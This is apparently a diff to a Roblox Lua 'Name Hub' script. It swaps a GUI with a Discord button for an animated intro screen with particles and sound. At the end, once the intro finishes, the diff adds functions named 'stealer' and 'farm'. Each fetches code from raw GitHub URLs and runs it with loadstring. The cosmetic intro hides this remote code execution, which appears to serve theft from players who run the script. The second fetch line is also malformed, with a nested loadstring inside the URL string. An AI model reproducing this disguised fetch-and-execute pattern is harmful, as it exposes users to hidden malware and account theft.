@@ -1,101 +1,203 @@
--- Name Hub GUI Script
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
 
--- Create ScreenGui
-local player = Players.LocalPlayer
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "NameHubGui"
-screenGui.Parent = player.PlayerGui
-screenGui.ResetOnSpawn = false
-
--- Create Main Frame (scaled ~6x in area: 200x100 -> 600x300)
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 600, 0, 300)
-mainFrame.Position = UDim2.new(0.5, -300, 0.5, -150)
-mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10) -- Dark base for gradient
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
-
--- Add Gradient
-local uiGradient = Instance.new("UIGradient")
-uiGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)), -- Cyan
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))  -- Magenta
-})
-uiGradient.Rotation = 45
-uiGradient.Parent = mainFrame
-
--- Add Corner Radius
-local uiCorner = Instance.new("UICorner")
-uiCorner.CornerRadius = UDim.new(0, 12)
-uiCorner.Parent = mainFrame
-
--- Add Glowing Effect
-local uiStroke = Instance.new("UIStroke")
-uiStroke.Thickness = 2
-uiStroke.Color = Color3.fromRGB(0, 255, 255)
-uiStroke.Transparency = 0.5
-uiStroke.Parent = mainFrame
-
--- Create Title Label
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, 0, 0, 60)
-titleLabel.Position = UDim2.new(0, 0, 0, 10)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "Name Hub"
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
-titleLabel.TextSize = 36
-titleLabel.Font = Enum.Font.FredokaOne -- Futuristic font
-titleLabel.Parent = mainFrame
-
--- Create Discord Button
-local discordButton = Instance.new("TextButton")
-discordButton.Size = UDim2.new(0, 100, 0, 50)
-discordButton.Position = UDim2.new(1, 10, 0.5, -25)
-discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242) -- Discord color
-discordButton.Text = "Discord"
-discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-discordButton.TextSize = 24
-discordButton.Font = Enum.Font.FredokaOne
-discordButton.Parent = mainFrame
-
-local discordCorner = Instance.new("UICorner")
-discordCorner.CornerRadius = UDim.new(0, 10)
-discordCorner.Parent = discordButton
-
--- Discord Button Click (Copies link to clipboard)
-discordButton.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard("https://discord.gg/4VRjtMQjsR")
-        local notification = Instance.new("TextLabel")
-        notification.Size = UDim2.new(0, 150, 0, 40)
-        notification.Position = UDim2.new(1, 20, 0.5, 30)
-        notification.BackgroundTransparency = 1
-        notification.Text = "Copied!"
-        notification.TextColor3 = Color3.fromRGB(0, 255, 255)
-        notification.TextSize = 20
-        notification.Font = Enum.Font.FredokaOne
-        notification.Parent = mainFrame
-        wait(1)
-        notification:Destroy()
+local function createIntro()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "NameHubIntro"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = playerGui
+    
+    local background = Instance.new("Frame")
+    background.Name = "Background"
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    background.BackgroundTransparency = 1
+    background.Parent = screenGui
+    
+    local logoContainer = Instance.new("Frame")
+    logoContainer.Name = "LogoContainer"
+    logoContainer.Size = UDim2.new(0.6, 0, 0.3, 0)
+    logoContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
+    logoContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+    logoContainer.BackgroundTransparency = 1
+    logoContainer.Parent = background
+    
+    local nameText = Instance.new("TextLabel")
+    nameText.Name = "NameText"
+    nameText.Size = UDim2.new(0.5, 0, 1, 0)
+    nameText.Position = UDim2.new(0, 0, 0, 0)
+    nameText.BackgroundTransparency = 1
+    nameText.Text = "Name"
+    nameText.Font = Enum.Font.GothamBold
+    nameText.TextSize = 48
+    nameText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    nameText.TextTransparency = 1
+    nameText.Parent = logoContainer
+    
+    local hubText = Instance.new("TextLabel")
+    hubText.Name = "HubText"
+    hubText.Size = UDim2.new(0.5, 0, 1, 0)
+    hubText.Position = UDim2.new(0.5, 0, 0, 0)
+    hubText.BackgroundTransparency = 1
+    hubText.Text = "Hub"
+    hubText.Font = Enum.Font.GothamBold
+    hubText.TextSize = 48
+    hubText.TextColor3 = Color3.fromRGB(0, 170, 255)
+    hubText.TextTransparency = 1
+    hubText.Parent = logoContainer
+    
+    local particles = Instance.new("Frame")
+    particles.Name = "Particles"
+    particles.Size = UDim2.new(1, 0, 1, 0)
+    particles.BackgroundTransparency = 1
+    particles.Parent = screenGui
+    
+    local introSound = Instance.new("Sound")
+    introSound.Name = "IntroSound"
+    introSound.SoundId = "rbxassetid://6042633475"
+    introSound.Volume = 0.5
+    introSound.Parent = screenGui
+    
+    for i = 1, 30 do
+        local particle = Instance.new("Frame")
+        particle.Name = "Particle" .. i
+        particle.Size = UDim2.new(0, math.random(3, 8), 0, math.random(3, 8))
+        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        particle.BackgroundColor3 = Color3.fromRGB(
+            math.random(0, 100), 
+            math.random(100, 255), 
+            math.random(200, 255)
+        )
+        particle.BackgroundTransparency = 0.2
+        particle.BorderSizePixel = 0
+        particle.Parent = particles
     end
-end)
+    
+    return {
+        ScreenGui = screenGui,
+        Background = background,
+        NameText = nameText,
+        HubText = hubText,
+        Particles = particles,
+        IntroSound = introSound
+    }
+end
 
--- Create Loading Bar Background
-local barBackground = Instance.new("Frame")
-barBackground.Size = UDim2.new(0.9, 0, 0, 20)
-barBackground.Position = UDim2.new(0.05, 0, 0, 180)
-barBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-barBackground.BorderSizePixel = 0
-barBackground.Parent = mainFrame
+local function playIntro()
+    local elements = createIntro()
+    
+    elements.IntroSound:Play()
+    
+    local bgTween = TweenService:Create(
+        elements.Background,
+        TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 0}
+    )
+    bgTween:Play()
+    
+    wait(0.5)
+    
+    local nameTween = TweenService:Create(
+        elements.NameText,
+        TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {TextTransparency = 0, Position = UDim2.new(0, 0, 0, 0)}
+    )
+    nameTween:Play()
+    
+    wait(0.3)
+    
+    local hubTween = TweenService:Create(
+        elements.HubText,
+        TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {TextTransparency = 0, Position = UDim2.new(0.5, 0, 0, 0)}
+    )
+    hubTween:Play()
+    
+    for _, particle in pairs(elements.Particles:GetChildren()) do
+        spawn(function()
+            local randomDelay = math.random() * 1.5
+            wait(randomDelay)
+            
+            local startPos = particle.Position
+            local endPos = UDim2.new(
+                math.random(), 
+                0, 
+                math.random(), 
+                0
+            )
+            
+            local particleTween = TweenService:Create(
+                particle,
+                TweenInfo.new(1.5, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut),
+                {Position = endPos, BackgroundTransparency = 1}
+            )
+            particleTween:Play()
+        end)
+    end
+    
+    wait(3)
+    
+    local bgFadeOut = TweenService:Create(
+        elements.Background,
+        TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+        {BackgroundTransparency = 1}
+    )
+    bgFadeOut:Play()
+    
+    local nameFadeOut = TweenService:Create(
+        elements.NameText,
+        TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+        {TextTransparency = 1}
+    )
+    nameFadeOut:Play()
+    
+    local hubFadeOut = TweenService:Create(
+        elements.HubText,
+        TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+        {TextTransparency = 1}
+    )
+    hubFadeOut:Play()
+    
+    for _, particle in pairs(elements.Particles:GetChildren()) do
+        TweenService:Create(
+            particle,
+            TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+            {BackgroundTransparency = 1}
+        ):Play()
+    end
+    
+    local soundFadeOut = TweenService:Create(
+        elements.IntroSound,
+        TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+        {Volume = 0}
+    )
+    soundFadeOut:Play()
+    
+    wait(1)
+    
+    elements.IntroSound:Stop()
+    elements.ScreenGui:Destroy()
+    
+    local introComplete = true
+    return introComplete
+end
 
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0, 6)
-barCorner.Parent = barBackground
+local introFinished = playIntro()
 
--- Create Loading Bar
-local loadingBar = Instance.new("Frame")
-loadingBar.Size = UDim2.new(0, 0, 1, 0)
-loadingBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-... (43 lines left)
+if introFinished then
+    print("NameHub intro has completed successfully")
+    local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHub123/NameHub/refs/heads/main/NameHub", true))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHub123/NameHabibiHub/refs/heads/main/NameHub'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
+end
